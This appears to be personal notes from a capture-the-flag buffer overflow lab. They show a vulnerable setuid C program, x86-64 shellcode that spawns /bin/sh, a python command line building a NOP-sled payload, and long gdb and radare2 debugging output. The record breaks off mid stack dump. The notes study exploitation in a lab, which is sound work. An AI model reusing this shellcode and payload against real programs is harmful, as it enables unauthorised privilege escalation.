
```sh
┌──(kali㉿kali)-[~]
└─$ ssh user1@10.10.131.13
The authenticity of host '10.10.131.13 (10.10.131.13)' can't be established.
ED25519 key fingerprint is SHA256:AsF56RWYwwHAw06LwzfQZsBY9+GuN1jrYmQRK3FP5dU.
This host key is known by the following other names/addresses:
    ~/.ssh/known_hosts:3: [hashed name]
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.10.131.13' (ED25519) to the list of known hosts.
user1@10.10.131.13's password: 
Last login: Wed Nov 27 21:42:30 2019 from 82.34.52.37

       __|  __|_  )
       _|  (     /   Amazon Linux 2 AMI
      ___|\___|___|

https://aws.amazon.com/amazon-linux-2/
ls -l[user1@ip-10-10-131-13 ~]$ ls -la
total 16
drwx------ 7 user1 user1 169 Nov 27  2019 .
drwxr-xr-x 6 root  root   61 Sep  2  2019 ..
-rw------- 1 user1 user1 202 Nov 27  2019 .bash_history
-rw-r--r-- 1 user1 user1  18 Jul 27  2018 .bash_logout
-rw-r--r-- 1 user1 user1 193 Jul 27  2018 .bash_profile
-rw-r--r-- 1 user1 user1 231 Jul 27  2018 .bashrc
drwxr-xr-x 3 user1 user1  21 Nov 27  2019 .cache
drwxrwxr-x 2 user1 user1  48 Sep  2  2019 overflow-1
drwxrwxr-x 2 user1 user1  48 Sep  2  2019 overflow-2
drwxrwxr-x 2 user1 user1  72 Sep  2  2019 overflow-3
drwxrwxr-x 2 user1 user1  76 Sep  3  2019 overflow-4
[user1@ip-10-10-131-13 ~]$ cd overflow-3
[user1@ip-10-10-131-13 overflow-3]$ ls -la
total 20
drwxrwxr-x 2 user1 user1   72 Sep  2  2019 .
drwx------ 7 user1 user1  169 Nov 27  2019 ..
-rwsrwxr-x 1 user2 user2 8264 Sep  2  2019 buffer-overflow
-rw-rw-r-- 1 user1 user1  285 Sep  2  2019 buffer-overflow.c
-rw------- 1 user2 user2   22 Sep  2  2019 secret.txt
[user1@ip-10-10-131-13 overflow-3]$
```

```c
#include <stdio.h>
#include <stdlib.h>

void copy_arg(char *string)
{
    char buffer[140];
    strcpy(buffer, string);
    printf("%s\n", buffer);
    return 0;
}

int main(int argc, char **argv)
{
    printf("Here's a program that echo's out your input\n");
    copy_arg(argv[1]);
}
```

shell code - code to open a basic shell
```
\x48\xb9\x2f\x62\x69\x6e\x2f\x73\x68\x11\x48\xc1\xe1\x08\x48\xc1\xe9\x08\x51\x48\x8d\x3c\x24\x48\x31\xd2\xb0\x3
```

the shell code disassembled (r2, aaa, pdf)
![[Images/Pasted image 20240809204245.png]]
A string containing the path to /bin/sh + 0x11 (random extra byte) is put in the RCX registry.
To get rid of the extra 0x11 rcx is first shifted one byte to the left and then to the right.
RCX is then pushed onto the stack.
Other requirements for the syscall to exectue the path are prepared and then the syscall is made.

Opening the c program with gdb
```sh
[user1@ip-10-10-15-3 overflow-3]$ gdb buffer-overflow
GNU gdb (GDB) Red Hat Enterprise Linux 8.0.1-30.amzn2.0.3
Copyright (C) 2017 Free Software Foundation, Inc.
License GPLv3+: GNU GPL version 3 or later <http://gnu.org/licenses/gpl.html>
This is free software: you are free to change and redistribute it.
There is NO WARRANTY, to the extent permitted by law.  Type "show copying"
and "show warranty" for details.
This GDB was configured as "x86_64-redhat-linux-gnu".
Type "show configuration" for configuration details.
For bug reporting instructions, please see:
<http://www.gnu.org/software/gdb/bugs/>.
Find the GDB manual and other documentation resources online at:
<http://www.gnu.org/software/gdb/documentation/>.
For help, type "help".
Type "apropos word" to search for commands related to "word"...
Reading symbols from buffer-overflow...(no debugging symbols found)...done.

(gdb) info functions
All defined functions:

Non-debugging symbols:
0x0000000000400400  _init
0x0000000000400430  strcpy@plt
0x0000000000400440  puts@plt
0x0000000000400450  _start
0x0000000000400480  deregister_tm_clones
0x00000000004004b0  register_tm_clones
0x00000000004004f0  __do_global_dtors_aux
0x0000000000400520  frame_dummy
0x0000000000400527  copy_arg
0x0000000000400564  main
0x00000000004005a0  __libc_csu_init
0x0000000000400610  __libc_csu_fini
0x0000000000400614  _fini

(gdb) info registers
The program has no registers now.

(gdb) start
Temporary breakpoint 1 at 0x400568
Starting program: /home/user1/overflow-3/buffer-overflow 
Missing separate debuginfos, use: debuginfo-install glibc-2.26-64.amzn2.0.2.x86_64

Temporary breakpoint 1, 0x0000000000400568 in main ()

(gdb) info registers
rax            0x400564 4195684
rbx            0x0      0
rcx            0x0      0
rdx            0x7fffffffe4a8   140737488348328
rsi            0x7fffffffe498   140737488348312
rdi            0x1      1
rbp            0x7fffffffe3b0   0x7fffffffe3b0
rsp            0x7fffffffe3b0   0x7fffffffe3b0
r8             0x400610 4195856
r9             0x7ffff7de8370   140737351943024
r10            0x0      0
r11            0x0      0
r12            0x400450 4195408
r13            0x7fffffffe490   140737488348304
r14            0x0      0
r15            0x0      0
rip            0x400568 0x400568 <main+4>
eflags         0x246    [ PF ZF IF ]
cs             0x33     51
ss             0x2b     43
ds             0x0      0
es             0x0      0
fs             0x0      0
gs             0x0      0

(gdb) q
A debugging session is active.

        Inferior 1 [process 13343] will be killed.

Quit anyway? (y or n) y
[user1@ip-10-10-15-3 overflow-3]$
```

time for r2
```sh
[user1@ip-10-10-54-231 overflow-3]$ r2 -d ./buffer-overflow
Process with PID 13282 started...
= attach 13282 13282
bin.baddr 0x00400000
Using 0x400000
asm.bits 64
 -- Select your architecture with: 'e asm.arch=<arch>' or r2 -a from the shell
 
[0x7ffff7dd9ef0]> aaa
[Cannot analyze at 0x00600ff0g with sym. and entry0 (aa)
Invalid address from 0x004005e9
[x] Analyze all flags starting with sym. and entry0 (aa)
[Warning: Invalid range. Use different search.in=? or anal.in=dbg.maps.x
Warning: Invalid range. Use different search.in=? or anal.in=dbg.maps.x
[x] Analyze function calls (aac)
[x] Analyze len bytes of instructions for references (aar)
[x] Check for objc references
[x] Check for vtables
[TOFIX: aaft can´t run in debugger mode.ions (aaft)
[x] Type matching analysis for all functions (aaft)
[x] Propagate noreturn information
[x] Use -AA or aaaa to perform additional experimental analysis.

[0x7ffff7dd9ef0]> ia
arch     x86
baddr    0x400000
binsz    6403
bintype  elf
bits     64
canary   false
class    ELF64
compiler GCC: (GNU) 7.3.1 20180303 (Red Hat 7.3.1-5)
crypto   false
endian   little
havecode true
intrp    /lib64/ld-linux-x86-64.so.2
laddr    0x0
lang     c
linenum  true
lsyms    true
machine  AMD x86-64 architecture
maxopsz  16
minopsz  1
nx       false
os       linux
pcalign  0
pic      false
relocs   true
relro    partial
rpath    NONE
sanitiz  false
static   false
stripped false
subsys   linux
va       true

[Imports]
nth vaddr      bind   type   name
―――――――――――――――――――――――――――――――――
1   0x00400430 GLOBAL FUNC   strcpy
2   0x00400440 GLOBAL FUNC   puts
3   0x00000000 GLOBAL FUNC   __libc_start_main
4   0x00000000 WEAK   NOTYPE __gmon_start__

[Exports]

nth paddr       vaddr      bind   type   size name
――――――――――――――――――――――――――――――――――――――――――――――――――
43   0x00000610 0x00400610 GLOBAL FUNC   2    __libc_csu_fini
47   0x00000527 0x00400527 GLOBAL FUNC   61   copy_arg
48   ---------- 0x0060102c GLOBAL NOTYPE 0    _edata
49   0x00000614 0x00400614 GLOBAL FUNC   0    _fini
51   0x00001028 0x00601028 GLOBAL NOTYPE 0    __data_start
53   0x00000628 0x00400628 GLOBAL OBJ    0    __dso_handle
54   0x00000620 0x00400620 GLOBAL OBJ    4    _IO_stdin_used
55   0x000005a0 0x004005a0 GLOBAL FUNC   101  __libc_csu_init
56   ---------- 0x00601030 GLOBAL NOTYPE 0    _end
57   0x00000450 0x00400450 GLOBAL FUNC   43   _start
58   ---------- 0x0060102c GLOBAL NOTYPE 0    __bss_start
59   0x00000564 0x00400564 GLOBAL FUNC   51   main
60   ---------- 0x00601030 GLOBAL OBJ    0    __TMC_END__
61   0x00000400 0x00400400 GLOBAL FUNC   0    _init

[0x7ffff7dd9ef0]> is
[Symbols]

nth paddr       vaddr      bind   type   size name
――――――――――――――――――――――――――――――――――――――――――――――――――
1    0x00000238 0x00400238 LOCAL  SECT   0    .interp
2    0x00000254 0x00400254 LOCAL  SECT   0    .note.ABI-tag
3    0x00000274 0x00400274 LOCAL  SECT   0    .note.gnu.build-id
4    0x00000298 0x00400298 LOCAL  SECT   0    .gnu.hash
5    0x000002b8 0x004002b8 LOCAL  SECT   0    .dynsym
6    0x00000330 0x00400330 LOCAL  SECT   0    .dynstr
7    0x00000374 0x00400374 LOCAL  SECT   0    .gnu.version
8    0x00000380 0x00400380 LOCAL  SECT   0    .gnu.version_r
9    0x000003a0 0x004003a0 LOCAL  SECT   0    .rela.dyn
10   0x000003d0 0x004003d0 LOCAL  SECT   0    .rela.plt
11   0x00000400 0x00400400 LOCAL  SECT   0    .init
12   0x00000420 0x00400420 LOCAL  SECT   0    .plt
13   0x00000450 0x00400450 LOCAL  SECT   0    .text
14   0x00000614 0x00400614 LOCAL  SECT   0    .fini
15   0x00000620 0x00400620 LOCAL  SECT   0    .rodata
16   0x0000065c 0x0040065c LOCAL  SECT   0    .eh_frame_hdr
17   0x00000698 0x00400698 LOCAL  SECT   0    .eh_frame
18   0x00000e10 0x00600e10 LOCAL  SECT   0    .init_array
19   0x00000e18 0x00600e18 LOCAL  SECT   0    .fini_array
20   0x00000e20 0x00600e20 LOCAL  SECT   0    .dynamic
21   0x00000ff0 0x00600ff0 LOCAL  SECT   0    .got
22   0x00001000 0x00601000 LOCAL  SECT   0    .got.plt
23   0x00001028 0x00601028 LOCAL  SECT   0    .data
24   ---------- 0x0060102c LOCAL  SECT   0    .bss
25   ---------- 0x00000000 LOCAL  SECT   0    .comment
26   ---------- 0x00000000 LOCAL  FILE   0    crtstuff.c
27   0x00000480 0x00400480 LOCAL  FUNC   0    deregister_tm_clones
28   0x000004b0 0x004004b0 LOCAL  FUNC   0    register_tm_clones
29   0x000004f0 0x004004f0 LOCAL  FUNC   0    __do_global_dtors_aux
30   ---------- 0x0060102c LOCAL  OBJ    1    completed.6984
31   0x00000e18 0x00600e18 LOCAL  OBJ    0    __do_global_dtors_aux_fini_array_entry
32   0x00000520 0x00400520 LOCAL  FUNC   0    frame_dummy
33   0x00000e10 0x00600e10 LOCAL  OBJ    0    __frame_dummy_init_array_entry
34   ---------- 0x00000000 LOCAL  FILE   0    buffer-overflow.c
35   ---------- 0x00000000 LOCAL  FILE   0    crtstuff.c
36   0x000007a4 0x004007a4 LOCAL  OBJ    0    __FRAME_END__
37   ---------- 0x00000000 LOCAL  FILE   0    
38   0x00000e18 0x00600e18 LOCAL  NOTYPE 0    __init_array_end
39   0x00000e20 0x00600e20 LOCAL  OBJ    0    _DYNAMIC
40   0x00000e10 0x00600e10 LOCAL  NOTYPE 0    __init_array_start
41   0x0000065c 0x0040065c LOCAL  NOTYPE 0    __GNU_EH_FRAME_HDR
42   0x00001000 0x00601000 LOCAL  OBJ    0    _GLOBAL_OFFSET_TABLE_
43   0x00000610 0x00400610 GLOBAL FUNC   2    __libc_csu_fini
44   0x00001028 0x00601028 WEAK   NOTYPE 0    data_start
47   0x00000527 0x00400527 GLOBAL FUNC   61   copy_arg
48   ---------- 0x0060102c GLOBAL NOTYPE 0    _edata
49   0x00000614 0x00400614 GLOBAL FUNC   0    _fini
51   0x00001028 0x00601028 GLOBAL NOTYPE 0    __data_start
53   0x00000628 0x00400628 GLOBAL OBJ    0    __dso_handle
54   0x00000620 0x00400620 GLOBAL OBJ    4    _IO_stdin_used
55   0x000005a0 0x004005a0 GLOBAL FUNC   101  __libc_csu_init
56   ---------- 0x00601030 GLOBAL NOTYPE 0    _end
57   0x00000450 0x00400450 GLOBAL FUNC   43   _start
58   ---------- 0x0060102c GLOBAL NOTYPE 0    __bss_start
59   0x00000564 0x00400564 GLOBAL FUNC   51   main
60   ---------- 0x00601030 GLOBAL OBJ    0    __TMC_END__
61   0x00000400 0x00400400 GLOBAL FUNC   0    _init
1    0x00000430 0x00400430 GLOBAL FUNC   16   imp.strcpy
2    0x00000440 0x00400440 GLOBAL FUNC   16   imp.puts
3    ---------- 0x00000000 GLOBAL FUNC   16   imp.__libc_start_main
4    ---------- 0x00000000 WEAK   NOTYPE 16   imp.__gmon_start__

[0x7ffff7dd9ef0]> afl
0x00400450    1 42           entry0
0x00400480    4 42   -> 37   sym.deregister_tm_clones
0x004004b0    4 58   -> 55   sym.register_tm_clones
0x004004f0    3 34   -> 29   entry.fini0
0x00400520    1 7            entry.init0
0x00400610    1 2            sym.__libc_csu_fini
0x00400527    1 61           sym.copy_arg
0x00400430    1 6            sym.imp.strcpy
0x00400440    1 6            sym.imp.puts
0x00400614    1 9            sym._fini
0x004005a0    3 101  -> 92   sym.__libc_csu_init
0x00400400    3 23           sym._init
0x00400564    1 51           main
0x7ffff7dd9ef0    1 71           fcn.7ffff7dd9ef0
0x7ffff7ddaab0  111 -136357633 -> 1549 fcn.7ffff7ddaab0
0x7ffff7de7f70   18 305  -> 288  fcn.7ffff7de7f70

[0x7ffff7dd9ef0]> afl | grep main
0x00400564    1 51           main
```

![[Images/Pasted image 20240808152921.png]]

![[Images/Pasted image 20240808153023.png]]

```sh
./buffer-overflow `python -c "print('\x90'*110+'\x48\xb9\x2f\x62\x69\x6e\x2f\x73\x68\x11\x48\xc1\xe1\x08\x48\xc1\xe9\x08\x51\x48\x8d\x3c\x24\x48\x31\xd2\xb0\x3b\x0f\x05'+'abcdefghijklmnopqrstuvwxyz')"`
```


```sh
[user1@ip-10-10-208-94 overflow-3]$ r2 -d ./buffer-overflow `python -c "print('\x90'*110+'\x48\xb9\x2f\x62\x69\x6e\x2f\x73\x68\x11\x48\xc1\xe1\x08\x48\xc1\xe9\x08\x51\x48\x8d\x3c\x24\x48\x31\xd2\xb0\x3b\x0f\x05'+'abcdefghijklmnopqrstuvwxyz')"`
Process with PID 18638 started...
= attach 18638 18638
bin.baddr 0x00400000
Using 0x400000
asm.bits 64
 -- Well, it looks like it´s working.
 
[0x7ffff7dd9ef0]> aaa
[Cannot analyze at 0x00600ff0g with sym. and entry0 (aa)
Invalid address from 0x004005e9
[x] Analyze all flags starting with sym. and entry0 (aa)
[Warning: Invalid range. Use different search.in=? or anal.in=dbg.maps.x
Warning: Invalid range. Use different search.in=? or anal.in=dbg.maps.x
[x] Analyze function calls (aac)
[x] Analyze len bytes of instructions for references (aar)
[x] Check for objc references
[x] Check for vtables
[TOFIX: aaft can´t run in debugger mode.ions (aaft)
[x] Type matching analysis for all functions (aaft)
[x] Propagate noreturn information
[x] Use -AA or aaaa to perform additional experimental analysis.

[0x7ffff7dd9ef0]> aaaa
[x] Analyze all flags starting with sym. and entry0 (aa)
[Warning: Invalid range. Use different search.in=? or anal.in=dbg.maps.x
Warning: Invalid range. Use different search.in=? or anal.in=dbg.maps.x
[x] Analyze function calls (aac)
[x] Analyze len bytes of instructions for references (aar)
[x] Check for objc references
[x] Check for vtables
[TOFIX: aaft can´t run in debugger mode.ions (aaft)
[x] Type matching analysis for all functions (aaft)
[x] Propagate noreturn information
[x] Use -AA or aaaa to perform additional experimental analysis.
[Warning: Invalid range. Use different search.in=? or anal.in=dbg.maps.x
[x] Finding function preludes
[x] Enable constraint types analysis for variables

[0x7ffff7dd9ef0]> afl
0x00400450    1 42           entry0
0x00400480    4 42   -> 37   sym.deregister_tm_clones
0x004004b0    4 58   -> 55   sym.register_tm_clones
0x004004f0    3 34   -> 29   entry.fini0
0x00400520    1 7            entry.init0
0x00400610    1 2            sym.__libc_csu_fini
0x00400527    1 61           sym.copy_arg
0x00400430    1 6            sym.imp.strcpy
0x00400440    1 6            sym.imp.puts
0x00400614    1 9            sym._fini
0x004005a0    3 101  -> 92   sym.__libc_csu_init
0x00400400    3 23           sym._init
0x00400564    1 51           main

[0x7ffff7dd9ef0]> pdf @main
┌ 51: int main (int argc, char **argv, char **envp);
│           ; var int64_t var_10h @ rbp-0x10
│           ; var int64_t var_4h @ rbp-0x4
│           ; arg int argc @ rdi
│           ; arg char **argv @ rsi
│           ; DATA XREF from entry0 @ 0x40046d
│           0x00400564      55             push rbp
│           0x00400565      4889e5         mov rbp, rsp
│           0x00400568      4883ec10       sub rsp, 0x10
│           0x0040056c      897dfc         mov dword [var_4h], edi     ; argc
│           0x0040056f      488975f0       mov qword [var_10h], rsi    ; argv
│           0x00400573      bf30064000     mov edi, str.Here_s_a_program_that_echo_s_out_your_input ; 0x400630 ; "Here's a program that echo's out your input"                                                                                            
│           0x00400578      e8c3feffff     call sym.imp.puts           ; int puts(const char *s)
│           0x0040057d      488b45f0       mov rax, qword [var_10h]
│           0x00400581      4883c008       add rax, 8
│           0x00400585      488b00         mov rax, qword [rax]
│           0x00400588      4889c7         mov rdi, rax
│           0x0040058b      e897ffffff     call sym.copy_arg
│           0x00400590      b800000000     mov eax, 0
│           0x00400595      c9             leave
└           0x00400596      c3             ret
[0x7ffff7dd9ef0]> pdf @sym.copy_arg
┌ 61: sym.copy_arg (int64_t arg1);
│           ; var int64_t var_98h @ rbp-0x98
│           ; var int64_t var_90h @ rbp-0x90
│           ; arg int64_t arg1 @ rdi
│           ; CALL XREF from main @ 0x40058b
│           0x00400527      55             push rbp
│           0x00400528      4889e5         mov rbp, rsp
│           0x0040052b      4881eca00000.  sub rsp, 0xa0
│           0x00400532      4889bd68ffff.  mov qword [var_98h], rdi    ; arg1
│           0x00400539      488b9568ffff.  mov rdx, qword [var_98h]
│           0x00400540      488d8570ffff.  lea rax, [var_90h]
│           0x00400547      4889d6         mov rsi, rdx
│           0x0040054a      4889c7         mov rdi, rax
│           0x0040054d      e8defeffff     call sym.imp.strcpy         ; char *strcpy(char *dest, const char *src)
│           0x00400552      488d8570ffff.  lea rax, [var_90h]
│           0x00400559      4889c7         mov rdi, rax
│           0x0040055c      e8dffeffff     call sym.imp.puts           ; int puts(const char *s)
│           0x00400561      90             nop
│           0x00400562      c9             leave
└           0x00400563      c3             ret
[0x7ffff7dd9ef0]> im
[Memory]


[0x7ffff7dd9ef0]> iz
[Strings]
nth paddr      vaddr      len size section type  string
―――――――――――――――――――――――――――――――――――――――――――――――――――――――
0   0x00000630 0x00400630 43  44   .rodata ascii Here's a program that echo's out your input

[0x7ffff7dd9ef0]> db
[0x7ffff7dd9ef0]> db 0x0040052b
[0x7ffff7dd9ef0]> db
0x0040052b - 0x0040052c 1 --x sw break enabled cmd="" cond="" name="0x0040052b" module="/home/user1/overflow-3/buffer-overflow"

[0x7ffff7dd9ef0]> dc
Here's a program that echo's out your input
hit breakpoint at: 40052b

[0x0040052b]> dr
rax = 0x7fffffffe623
rbx = 0x00000000
rcx = 0x7ffff7b0d584
rdx = 0x7ffff7dd58c0
r8 = 0x00000003
r9 = 0x00000077
r10 = 0x00000000
r11 = 0x00000246
r12 = 0x00400450
r13 = 0x7fffffffe3d0
r14 = 0x00000000
r15 = 0x00000000
rsi = 0x00602260
rdi = 0x7fffffffe623
rsp = 0x7fffffffe2d0
rbp = 0x7fffffffe2d0
rip = 0x0040052b
rflags = 0x00000212
orax = 0xffffffffffffffff

[0x0040052b]> ds

[0x0040052b]> dr
rax = 0x7fffffffe623
rbx = 0x00000000
rcx = 0x7ffff7b0d584
rdx = 0x7ffff7dd58c0
r8 = 0x00000003
r9 = 0x00000077
r10 = 0x00000000
r11 = 0x00000246
r12 = 0x00400450
r13 = 0x7fffffffe3d0
r14 = 0x00000000
r15 = 0x00000000
rsi = 0x00602260
rdi = 0x7fffffffe623
rsp = 0x7fffffffe230
rbp = 0x7fffffffe2d0
rip = 0x00400532
rflags = 0x00000206
orax = 0xffffffffffffffff

[0x0040052b]> db
0x0040052b - 0x0040052c 1 --x sw break enabled cmd="" cond="" name="0x0040052b" module="/home/user1/overflow-3/buffer-overflow"

[0x0040052b]> db 0x400552

[0x0040052b]> db
0x0040052b - 0x0040052c 1 --x sw break enabled cmd="" cond="" name="0x0040052b" module="/home/user1/overflow-3/buffer-overflow"
0x00400552 - 0x00400553 1 --x sw break enabled cmd="" cond="" name="0x400552" module="/home/user1/overflow-3/buffer-overflow"

[0x0040052b]> dc
child stopped with signal 28
[+] SIGNAL 28 errno=0 addr=0x00000000 code=128 ret=0

[0x00400532]> dr
rax = 0x7fffffffe623
rbx = 0x00000000
rcx = 0x7ffff7b0d584
rdx = 0x7ffff7dd58c0
r8 = 0x00000003
r9 = 0x00000077
r10 = 0x00000000
r11 = 0x00000246
r12 = 0x00400450
r13 = 0x7fffffffe3d0
r14 = 0x00000000
r15 = 0x00000000
rsi = 0x00602260
rdi = 0x7fffffffe623
rsp = 0x7fffffffe230
rbp = 0x7fffffffe2d0
rip = 0x00400532
rflags = 0x00000206
orax = 0xffffffffffffffff

[0x00400532]> ds

[0x00400532]> dr
rax = 0x7fffffffe623
rbx = 0x00000000
rcx = 0x7ffff7b0d584
rdx = 0x7ffff7dd58c0
r8 = 0x00000003
r9 = 0x00000077
r10 = 0x00000000
r11 = 0x00000246
r12 = 0x00400450
r13 = 0x7fffffffe3d0
r14 = 0x00000000
r15 = 0x00000000
rsi = 0x00602260
rdi = 0x7fffffffe623
rsp = 0x7fffffffe230
rbp = 0x7fffffffe2d0
rip = 0x00400539
rflags = 0x00000206
orax = 0xffffffffffffffff

[0x00400532]> px @rsp
- offset -       0 1  2 3  4 5  6 7  8 9  A B  C D  E F  0123456789ABCDEF
0x7fffffffe230  c0f8 dcf7 ff7f 0000 23e6 ffff ff7f 0000  ........#.......                                                     
0x7fffffffe240  2b00 0000 0000 0000 2c00 0000 0000 0000  +.......,.......
0x7fffffffe250  0a00 0000 0000 0000 3006 4000 0000 0000  ........0.@.....
0x7fffffffe260  0004 ddf7 ff7f 0000 0000 0000 0000 0000  ................
0x7fffffffe270  0000 0000 0000 0000 e12b aaf7 ff7f 0000  .........+......
0x7fffffffe280  6047 ddf7 ff7f 0000 982f aaf7 ff7f 0000  `G......./......
0x7fffffffe290  2b00 0000 0000 0000 6047 ddf7 ff7f 0000  +.......`G......
0x7fffffffe2a0  3006 4000 0000 0000 0c82 a9f7 ff7f 0000  0.@.............
0x7fffffffe2b0  0000 0000 0000 0000 0000 0000 0000 0000  ................
0x7fffffffe2c0  f0e2 ffff ff7f 0000 5004 4000 0000 0000  ........P.@.....
0x7fffffffe2d0  f0e2 ffff ff7f 0000 9005 4000 0000 0000  ..........@.....
0x7fffffffe2e0  d8e3 ffff ff7f 0000 0000 0000 0200 0000  ................
0x7fffffffe2f0  a005 4000 0000 0000 3ad1 a4f7 ff7f 0000  ..@.....:.......
0x7fffffffe300  0000 0000 0000 0000 d8e3 ffff ff7f 0000  ................
0x7fffffffe310  0000 0400 0200 0000 6405 4000 0000 0000  ........d.@.....
0x7fffffffe320  0000 0000 0000 0000 d2d9 7c6a 3a7f 2a53  ..........|j:.*S

[0x00400532]> pxw @rsp
0x7fffffffe230  0xf7dcf8c0 0x00007fff 0xffffe623 0x00007fff  ........#.......
0x7fffffffe240  0x0000002b 0x00000000 0x0000002c 0x00000000  +.......,.......
0x7fffffffe250  0x0000000a 0x00000000 0x00400630 0x00000000  ........0.@.....
0x7fffffffe260  0xf7dd0400 0x00007fff 0x00000000 0x00000000  ................
0x7fffffffe270  0x00000000 0x00000000 0xf7aa2be1 0x00007fff  .........+......
0x7fffffffe280  0xf7dd4760 0x00007fff 0xf7aa2f98 0x00007fff  `G......./......
0x7fffffffe290  0x0000002b 0x00000000 0xf7dd4760 0x00007fff  +.......`G......
0x7fffffffe2a0  0x00400630 0x00000000 0xf7a9820c 0x00007fff  0.@.............
0x7fffffffe2b0  0x00000000 0x00000000 0x00000000 0x00000000  ................
0x7fffffffe2c0  0xffffe2f0 0x00007fff 0x00400450 0x00000000  ........P.@.....
0x7fffffffe2d0  0xffffe2f0 0x00007fff 0x00400590 0x00000000  ..........@.....
0x7fffffffe2e0  0xffffe3d8 0x00007fff 0x00000000 0x00000002  ................
0x7fffffffe2f0  0x004005a0 0x00000000 0xf7a4d13a 0x00007fff  ..@.....:.......
0x7fffffffe300  0x00000000 0x00000000 0xffffe3d8 0x00007fff  ................
0x7fffffffe310  0x00040000 0x00000002 0x00400564 0x00000000  ........d.@.....
0x7fffffffe320  0x00000000 0x00000000 0x6a7cd9d2 0x532a7f3a  ..........|j:.*S

[0x00400532]> pxa @rsp
    - offset -   0 1  2 3  4 5  6 7  8 9  A B  C D  E F  0123456789ABCDEF
                 /rsp                                                   
0x7fffffffe230  c0f8 dcf7 ff7f 0000 23e6 ffff ff7f 0000  ........#.......
0x7fffffffe240  2b00 0000 0000 0000 2c00 0000 0000 0000  +.......,.......
0x7fffffffe250  0a00 0000 0000 0000 3006 4000 0000 0000  ........0.@.....
0x7fffffffe260  0004 ddf7 ff7f 0000 0000 0000 0000 0000  ................
0x7fffffffe270  0000 0000 0000 0000 e12b aaf7 ff7f 0000  .........+......
0x7fffffffe280  6047 ddf7 ff7f 0000 982f aaf7 ff7f 0000  `G......./......
0x7fffffffe290  2b00 0000 0000 0000 6047 ddf7 ff7f 0000  +.......`G......
0x7fffffffe2a0  3006 4000 0000 0000 0c82 a9f7 ff7f 0000  0.@.............
0x7fffffffe2b0  0000 0000 0000 0000 0000 0000 0000 0000  ................
0x7fffffffe2c0  f0e2 ffff ff7f 0000 5004 4000 0000 0000  ........P.@.....
                 /rbp                                                   
0x7fffffffe2d0  f0e2 ffff ff7f 0000 9005 4000 0000 0000  ..........@.....
0x7fffffffe2e0  d8e3 ffff ff7f 0000 0000 0000 0200 0000  ................
0x7fffffffe2f0  a005 4000 0000 0000 3ad1 a4f7 ff7f 0000  ..@.....:.......
0x7fffffffe300  0000 0000 0000 0000 d8e3 ffff ff7f 0000  ................
0x7fffffffe310  0000 0400 0200 0000 6405 4000 0000 0000  ........d.@.....
0x7fffffffe320  0000 0000 0000 0000 d2d9 7c6a 3a7f 2a53  ..........|j:.*S

[0x00400532]> pxr @rsp
0x7fffffffe230 0x00007ffff7dcf8c0   ........ @rsp (/usr/lib64/libc-2.26.so) library R X 'add byte [rax], al' 'libc-2.26.so'
0x7fffffffe238 0x00007fffffffe623   #....... ([stack]) stack R W X 'nop' '[stack]'
0x7fffffffe240 0x000000000000002b   +....... 43 (.comment) ascii ('+')
0x7fffffffe248 0x000000000000002c   ,....... 44 (.symtab) ascii (',')
0x7fffffffe250 0x000000000000000a   ........ 10 (.comment)
0x7fffffffe258 0x0000000000400630   0.@..... (/home/user1/overflow-3/buffer-overflow) 4195888 (.rodata) str.Here_s_a_program_that_echo_s_out_your_input program R X 'jb 0x400699' 'buffer-overflow' (Here's a program that echo's out your input)
0x7fffffffe260 0x00007ffff7dd0400   ........ (/usr/lib64/libc-2.26.so) library R X 'add byte [rax], al' 'libc-2.26.so'
0x7fffffffe268 ..[ null bytes ]..   00000000 
0x7fffffffe278 0x00007ffff7aa2be1   .+...... (/usr/lib64/libc-2.26.so) library R X 'cmp rbx, rax' 'libc-2.26.so'
0x7fffffffe280 0x00007ffff7dd4760   `G...... (/usr/lib64/libc-2.26.so) library R W X 'test byte [rdx], ch' 'libc-2.26.so'
0x7fffffffe288 0x00007ffff7aa2f98   ./...... (/usr/lib64/libc-2.26.so) library R X 'cmp eax, 0xffffffffffffffff' 'libc-2.26.so'
0x7fffffffe290 0x000000000000002b   +....... 43 (.comment) ascii ('+')
0x7fffffffe298 0x00007ffff7dd4760   `G...... (/usr/lib64/libc-2.26.so) library R W X 'test byte [rdx], ch' 'libc-2.26.so'
0x7fffffffe2a0 0x0000000000400630   0.@..... (/home/user1/overflow-3/buffer-overflow) 4195888 (.rodata) str.Here_s_a_program_that_echo_s_out_your_input program R X 'jb 0x400699' 'buffer-overflow' (Here's a program that echo's out your input)
0x7fffffffe2a8 0x00007ffff7a9820c   ........ (/usr/lib64/libc-2.26.so) library R X 'cmp eax, 0xffffffffffffffff' 'libc-2.26.so'
0x7fffffffe2b0 ..[ null bytes ]..   00000000 
0x7fffffffe2c0 0x00007fffffffe2f0   ........ ([stack]) stack R W X 'movabs al, byte [0x3a00000000004005]' '[stack]'
0x7fffffffe2c8 0x0000000000400450   P.@..... (/home/user1/overflow-3/buffer-overflow) 4195408 (.text) entry0 program R X 'xor ebp, ebp' 'buffer-overflow'
0x7fffffffe2d0 0x00007fffffffe2f0   ........ @rbp ([stack]) stack R W X 'movabs al, byte [0x3a00000000004005]' '[stack]'
0x7fffffffe2d8 0x0000000000400590   ..@..... (/home/user1/overflow-3/buffer-overflow) 4195728 (.text) main program R X 'mov eax, 0' 'buffer-overflow'
0x7fffffffe2e0 0x00007fffffffe3d8   ........ ([stack]) stack R W X 'adc esi, esp' '[stack]'
0x7fffffffe2e8 0x0000000200000000   ........ 8589934592
0x7fffffffe2f0 0x00000000004005a0   ..@..... (/home/user1/overflow-3/buffer-overflow) 4195744 (.text) sym.__libc_csu_init sym.__libc_csu_init program R X 'push r15' 'buffer-overflow'
0x7fffffffe2f8 0x00007ffff7a4d13a   :....... (/usr/lib64/libc-2.26.so) library R X 'mov edi, eax' 'libc-2.26.so'
0x7fffffffe300 ..[ null bytes ]..   00000000 
0x7fffffffe308 0x00007fffffffe3d8   ........ ([stack]) stack R W X 'adc esi, esp' '[stack]'
0x7fffffffe310 0x0000000200040000   ........ 8590196736
0x7fffffffe318 0x0000000000400564   d.@..... (/home/user1/overflow-3/buffer-overflow) 4195684 (.text) sym.main main program R X 'push rbp' 'buffer-overflow'                                                                                                
0x7fffffffe320 ..[ null bytes ]..   00000000 
0x7fffffffe328 0x532a7f3a6a7cd9d2   ..|j:.*S 0

[0x00400532]> px/100x @rsp
- offset -       0 1  2 3  4 5  6 7  8 9  A B  C D  E F  0123456789ABCDEF
0x7fffffffe230  c0f8 dcf7 ff7f 0000 23e6 ffff ff7f 0000  ........#.......                                                     
